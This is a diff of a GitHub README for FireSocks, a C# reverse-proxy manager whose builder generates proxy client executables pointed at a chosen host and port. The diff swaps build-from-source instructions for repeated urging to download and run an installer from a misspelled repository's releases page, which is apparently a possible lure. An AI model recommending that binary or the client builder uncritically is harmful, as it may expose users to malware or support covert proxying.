@@ -1,74 +1,85 @@
+# 🔄 Reverse-Proxy-Soruce-Code - Manage Your Proxy Connections Effortlessly
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/releases)
 
-# FireSocks Reverse Proxy
+## 🚀 Getting Started
 
-FireSocks is a C# Windows Forms application that allows users to manage and configure proxy servers. It provides interface for setting up proxy listeners, viewing active connections, and creating proxy client executables tailored to specific configurations.
+Welcome to the Reverse-Proxy-Soruce-Code! FireSocks is a C# application designed to help you manage your proxy servers seamlessly. Whether you need to configure your settings, monitor connections, or create custom proxy clients, this tool simplifies the process for you.
 
-## Features
+## 📥 Download & Install
 
-- **Proxy Management**: Easily configure and manage multiple proxies with the ability to start, stop, and monitor active connections.
-- **Custom Proxy Client Builder**: Generate custom proxy client executables with specified host addresses, ports, and optional features.
-- **Intuitive UI**:  interface with clear status updates, configurable options, and real-time feedback on proxy usage.
+To get started with FireSocks, follow these simple steps:
 
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page:
+   [Download FireSocks](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/releases)
 
-## Getting Started
+2. **Select the Latest Version**  
+   On the Releases page, look for the most recent version of FireSocks. This version contains improvements and bug fixes.
 
-### Prerequisites
+3. **Download the Application**  
+   Click on the file that matches your system. Follow the prompts to download the file to your computer.
 
-- .NET Framework 4.8 or later
-- Visual Studio 2022
-- C#
+4. **Run the Installer**  
+   Once the download is complete, locate the file and double-click it to run the installer. Follow the instructions to install FireSocks on your device.
 
-### Installation
+5. **Launch FireSocks**  
+   After installation, open FireSocks from your applications menu or desktop shortcut. You're ready to start managing your proxy connections!
 
-1. **Clone the repository**
+## 🖥️ System Requirements
 
-2. **Open the project in Visual Studio**:
+To run FireSocks smoothly, ensure your system meets the following requirements:
 
-3. **Build the project**:
-   Build the solution to restore NuGet packages and compile the project.
+- **Operating System:** Windows 10 or later
+- **Processor:** Minimum 1 GHz processor
+- **RAM:** At least 2 GB
+- **Storage:** 100 MB of available space
+- **.NET Framework:** Version 4.7.2 or later
 
-4. **Run the application**:
-   Start the application by running the project through Visual Studio.
+## ⚙️ Features
 
-### Usage
+FireSocks offers various features to make managing proxy servers easy:
 
-#### Starting a Proxy Listener
+- **Easy Configuration:** Set up your proxy server preferences without hassle.
+- **Connection Monitoring:** Keep track of your active connections in real-time.
+- **Custom Proxy Client Generation:** Create a personalized proxy client to fit your needs.
+- **User-Friendly Interface:** Navigate through options easily with our intuitive design.
+- **Support for Multiple Proxy Types:** Work with HTTP, HTTPS, and SOCKS protocols.
 
-1. Navigate to **Configuration Form** by clicking on the appropriate menu option.
-2. Enter the desired ports and validate the configuration.
-3. Click **Start Listener** to begin the proxy service.
+## 📊 Usage Instructions
 
-#### Viewing Active Proxies
+1. **Configure Your Proxy Settings**  
+   Open FireSocks and go to the settings menu. Enter your proxy server details, including the IP address and port number.
 
-- Active proxies will be displayed in the main interface with real-time updates on their status and usage.
+2. **Monitor Connections**  
+   Check the active connections tab. This section displays all the current connections, allowing you to manage them effectively.
 
-#### Building a Proxy Client
+3. **Generate a Proxy Client**  
+   Go to the proxy client section. Choose your specifications and click the generate button to create your custom client.
 
-1. Open **Build Proxy ** through the menu.
-2. Specify the output path, host address, and port for the proxy client.
-3. Click **Build** to generate the proxy client executable.
+4. **Test Your Configuration**  
+   Use the built-in testing feature to ensure your proxy settings work correctly before going live.
 
-### Advanced Features
+## 💬 Troubleshooting
 
-- **Custom ListView Control**: A specialized list view control is used to display proxy information with enhanced features.
-- **Resource Management**: Modify and manage binary resources for generating custom proxy clients.
+If you encounter issues while using FireSocks, consider the following tips:
 
+- **Check Your Internet Connection:** Ensure your internet connection is stable and working.
+- **Verify Proxy Settings:** Double-check your proxy server details for accuracy.
+- **Update .NET Framework:** Make sure you have the latest version of .NET Framework installed.
+- **Reinstall the Application:** If problems persist, uninstall and reinstall FireSocks.
 
-## Screenshots
+## 🌐 Community Support
 
+For assistance or to share feedback, please visit our GitHub Discussions page. You can ask questions, report issues, or engage with other users.
 
-![reverseproxy](https://github.com/user-attachments/assets/2242714c-3657-488f-9f33-3d04139a044b)
+## ⭐ Acknowledgments
 
-![image](https://github.com/user-attachments/assets/60557a92-cb29-43e4-bc82-4d708b1dd302)
+Thank you for using FireSocks! We appreciate your support. Your feedback helps improve the application for everyone.
 
-![r-p-build](https://github.com/user-attachments/assets/c1bfa24e-4e23-497b-830f-0e25c114b9aa)
+## 📥 Download FireSocks Now!
 
-### Contributions
+For your convenience, here is the download link once more:  
+[Download FireSocks](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/releases) 
 
-Leave a Star on this Repo
-
-### License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+Explore the features and enjoy seamless management of your proxy servers!
